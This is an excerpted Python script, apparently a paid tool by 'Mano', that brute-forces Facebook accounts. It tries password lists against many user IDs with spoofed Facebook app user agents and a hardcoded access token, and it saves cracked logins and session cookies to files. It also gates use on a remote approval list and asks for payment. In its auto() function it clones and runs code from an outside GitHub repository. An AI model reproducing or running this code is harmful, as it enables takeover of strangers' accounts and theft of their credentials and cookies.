...
try:
  ...
  os.system("pip install pycurl")
  import pycurl
os.system('xdg-open https://chat.whatsapp.com/FcpcAfJlseNHDj2NNdXPVr')
...
try:
    ...
    print('\x1b[1;92m[√] PLEASE WAIT CHECKING Owner MANO UPDATE...')
...
for agent in range(10000):
    ...
    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.5389.99'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
...
device = {
        ...
        'fbca':fbca,
        'fbdm':fbdm}
os.system('xdg-open https://www.facebook.com/manojutti01.py')
def ua_api():
	rhm = str(random.randint(100,400))
	return (f"[FBAN/Orca-Android;FBAV/"+rhm+".0.0.57.214;FBBV/426817936;FBLC/en_GB;FBRV/428276664;FBCR/Nepal Telecom;FBMF/LGE;FBBD/lge;FBPN/com.facebook.orca;FBDV/LMK525;FBSV/11;FBOP/1;FBCA/armeabi-v7a:armeabi;FBDM/{density=1.75,width=720,height=1422};]")
...
logo=(f"""{WHITE}
 ...
 \033[1;36m##     ## ######### ##  #### ##     ## 
 \033[1;37m##     ## ##     ## ##   ### ##     ## 
 \033[1;33m##     ## ##     ## ##    ##  ####### \033[1;32mJuTti\033[1;37m 

╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗
   \t[×] Developed By Mano  {GREEN} (Jutti)
╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝
{WHITE}================================================
{WHITE}[•] AUTHOR       :Owner Mano
{WHITE}[•] WhatsApp     :+92305919****
{WHITE}[•] Facebook     :Mano Jutti 
[•] Status       :Paid
[•] Version      :{GREEN}0.5
{WHITE}[•] YouTube      :Mano Queen
{WHITE}================================================
   \33[37;41m\t Welcome x To x Mano   x Tool\33[0;m
{WHITE}=================================================""")
def linex():
    print('\033[1;37m----------------------------------------------')
...
def approval():
  ...
  try:
    httpCaht = get_response('https://raw.githubusercontent.com/Eshajutti01/Aproval.txt/main/Aproval.txt')
    if realid in httpCaht:
      ...
      print('\33[1;37m ====================================================')
      print (" \33[37;41m\t WELCOME TO MANOI TOOL AND ENJOY \33[0;m")
      print('\33[1;37m ====================================================')
      ...
      print('\33[1;37m ====================================================')
      print ("\33[1;37m Easy Paisa (03274215060)")
      print ("\33[1;37m Jazz Cash  (03274215060)")
        ...
        #        clear()
                ...
                if x == ("***"):
                        ...
                        if xd in ['1','01']:
                                ...
                                print(' PUT FILE EXAMPLE :  /sdcard/File.Mano.etc..')
                                linex()
...
def pak():
                ...
                with tred(max_workers=30) as TRT:     
                        ...
                        print('[+] Select code: \033[1;92m '+code)
...
def ffb(ids,names,passlist):
        try:
                ...
                sys.stdout.write('\r\r\033[1;37m [MANO-RUNING-M1] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                ...
                for pw in passlist:
                        ...
                        ua = ",[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+";[FBAN/FB4A;FBAV/24.6.7.561;FBBV/2489249;[FBAN/FB4A;FBAV/441.0.0.23.107;FBBV/447211722;FBDM/{density=2.95,width=1080,height=2400};FBLC/be_BY;FBCR/Vodafone;FBMF/Infinix;FBBD/Infinix;FBPN/com.facebook.katana;FBDV/SM-G932F;FBSV/13;FBOP/1;FBCA/armeabi-v7a:armeabi;],"                       
                        ...
                        if 'session_key' in po:
                                     ...
                                     #   print("\r\r\033[1;33m Cookie: "+coki)
                                        open('/sdcard/MANO-COOKIE.txt','a').write(ids+'|'+pas+ ' | ' +coki+'\n')
                                        ...
                                        if 'y' in pcp:
                                              #  print('\r\r\x1b[1;31m [ALONE-MANO-CP] '+ids+' | '+pas+'\033[1;97m')
...
def api(ids,names,passlist):
        try:
                global ok,loop,sim_id
                sys.stdout.write('\r\r\033[1;37m [MANO-RUNING-M2 ] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
...
def api1(ids,names,passlist):
        global loop
        global oks
        sys.stdout.write('\r\r\033[1;37m [MANO-RUNING] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        try:
                for pas in passlist:
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
                        ...
                        cph = random.choice(['CPH1979','CPH1983','CPH1987','CPH2005','CPH2009','CPH2015','CPH2059','CPH2061','CPH2065','CPH2069','CPH2071','CPH2073','CPH2077','CPH2091','CPH2095','CPH2099','CPH2137','CPH2139','CPH2145','CPH2161','CPH2185','CPH2201','CPH2209','CPH1801','CPH1803','CPH1805','CPH1809','CPH1827','CPH1837','CPH1851','CPH1853'])
                        network = random.choice(['Zong','null','Marshmallow','Telekom China'])
                        ua  = "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,313)) +";FBBV/"+str(random.randint(11111111,77777777))+";[FBAN/FB4A;FBAV/24.6.7.561;FBBV/2489249;[FBAN/FB4A;FBAV/441.0.0.23.107;FBBV/447211722;FBDM/{density=2.95,width=1080,height=2400};FBLC/be_BY;FBCR/Vodafone;FBMF/Infinix;FBBD/Infinix;FBPN/com.facebook.katana;FBDV/SM-G932F;FBSV/13;FBOP/1;FBCA/armeabi-v7a:armeabi;]"
                        random_seed = random.Random()
                        adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
                        device_id = str(uuid.uuid4())
                        secure = str(uuid.uuid4())
                        ...
                        if 'session_key' in po:
                                ...
                                if str(uid) in oks:
                                        ...
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        #print("\r\r\033[1;33m Cookie: "+coki)
                                        open('/sdcard/MANO-COKIE.txt','a').write(str(uid)+'|'+pas+ ' | ' +coki+'\n')
                                        open('/sdcard/MANO-rnd-OK.txt','a').write(str(uid)+'|'+pas+'\n')
                                        oks.append(str(uid))
                                        break
                        elif 'www.facebook.com' in po['error']['message']:
                                try:
                                ...
                                if uid in oks:pass
                                    ...
                                    #    print('\r\r\x1b[1;31m [MANO-CP] '+str(uid)+' | '+pas+'\033[1;97m')
                                        open('/sdcard/MANO-rnd-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                        cps.append(str(ids))
                                        break
                        else:continue
                loop+=1
                ...
                for pas in passlist:
                        ...
                        if 'your account was locked' in po:
                                ...
                                if str(uid) in oks:
                                        ...
                                        print("\r\r\033[1;33m Cookie: "+coki)
                                        open('/sdcard/MANO-COKIE.txt','a').write(str(uid)+'|'+pas+ ' | ' +coki+'\n')
                                        open('/sdcard/MANO-OK.txt','a').write(str(uid)+'|'+pas+'\n')
                                        oks.append(str(uid))
                                        break
                        elif 'www.facebook.com' in po['error']['message']:
                                try:
...
#####_____END_____#####
def auto():
    os.system('cd && git clone https://github.com/AWAN-143/xd')
    os.system('cd xd && python awan.py')
menu()